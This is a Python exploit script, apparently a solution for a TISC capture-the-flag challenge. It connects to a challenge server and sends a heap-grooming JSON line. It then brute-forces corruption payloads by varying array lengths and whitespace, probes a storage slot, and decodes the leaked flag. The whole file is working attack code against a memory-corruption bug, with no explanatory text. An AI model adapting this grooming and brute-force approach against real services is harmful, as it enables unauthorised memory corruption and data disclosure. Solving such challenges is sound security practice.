#!/usr/bin/env python3
import json
import socket
import time
import random
import sys

HOST = ('chals.tisc25.ctf.sg', 51728)

def send_lines(lines, timeout=6, sleep_between=0.05):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect(HOST)
        out = []
        for line in lines:
            if not line.endswith('\n'):
                line = line + '\n'
            s.sendall(line.encode())
            try:
                resp = s.recv(16384)
            except socket.timeout:
                resp = b''
            out.append(resp)
            time.sleep(sleep_between)
        return out
    finally:
        try:
            s.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        s.close()


def fmt_array(n, comma_space=0):
    # comma_space=0 -> no spaces; 1 -> one space after comma; 2 -> two spaces, etc.
    if n <= 0:
        return "[]"
    # keep numbers small to keep tokens short
    elems = [str(i % 10) for i in range(n)]
    if comma_space > 0:
        sep = "," + (" " * comma_space)
    else:
        sep = ","
    return "[" + sep.join(elems) + "]"


def craft_line(n, comma_space=0, colon_space_slot=0, colon_space_data=0, trail_spaces=0):
    # colon_space_* is number of spaces after ':'
    slot_part = f"\"slot\":{ ' ' * colon_space_slot }1"
    data_arr = fmt_array(n, comma_space=comma_space)
    data_part = f"\"data\":{ ' ' * colon_space_data }{data_arr}"
    body = slot_part + "," + data_part
    line = "{" + body + "}" + (" " * trail_spaces)
    return line


def try_once(n, comma_space, cslot, cdata, trail):
    # feng shui first
    feng = craft_line(3, 0, 0, 0, 0).replace('data\":[0,1,2]', 'data\":[69,2,0]')
    # corruption candidate
    corr = craft_line(n, comma_space=comma_space, colon_space_slot=cslot, colon_space_data=cdata, trail_spaces=trail)
    # probes
    probes = [ '{"slot":0}', '{"slot":0, "data":[]}', '{"slot":0, "data":[69,2,0]}' ]
    lines = [feng, corr] + probes
    try:
        resps = send_lines(lines, timeout=6, sleep_between=0.05)
    except Exception as e:
        return False, [f"EXC: {e}".encode()]
    # check any probe reply
    for r in resps[-3:]:
        if b'TISC{' in r or b'Slot 0 contains:' in r:
            return True, resps
    return False, resps


def hunt():
    random.seed()
    attempts = 0
    # parameter grids (keep small per run to avoid rate-limit)
    Ns = [42, 43, 44, 45, 46]
    comma_spaces = [0, 1]
    colon_slot = [0, 1]
    colon_data = [0, 1]
    trails = list(range(0, 9))

    for n in Ns:
        for cs in comma_spaces:
            for cslot in colon_slot:
                for cdata in colon_data:
                    # shuffle trail spaces each group
                    random.shuffle(trails)
                    for tr in trails:
                        attempts += 1
                        ok, resps = try_once(n, cs, cslot, cdata, tr)
                        # brief backoff each attempt
                        time.sleep(0.12 + random.random()*0.2)
                        # print compact log
                        rsum = b' | '.join(x[:60] for x in resps if isinstance(x, (bytes, bytearray)))
                        print(f"n={n} cs={cs} cslot={cslot} cdata={cdata} tr={tr} -> {rsum!r}")
                        if ok:
                            # decode if needed
                            for r in resps[-3:]:
                                if b'Slot 0 contains:' in r and b'[' in r and b']' in r:
                                    try:
                                        arr = r[r.index(b'['): r.index(b']')+1]
                                        vals = json.loads(arr)
                                        flag = ''.join(chr(x) for x in vals if isinstance(x, int) and 0 <= x < 256 and x != 0)
                                        print("DECODED:", flag)
                                    except Exception:
                                        pass
                            print("SUCCESS")
                            return True
                        # occasional longer backoff to respect service
                        if attempts % 8 == 0:
                            time.sleep(1.2)
    return False

if __name__ == '__main__':
    ok = hunt()
    sys.exit(0 if ok else 1)
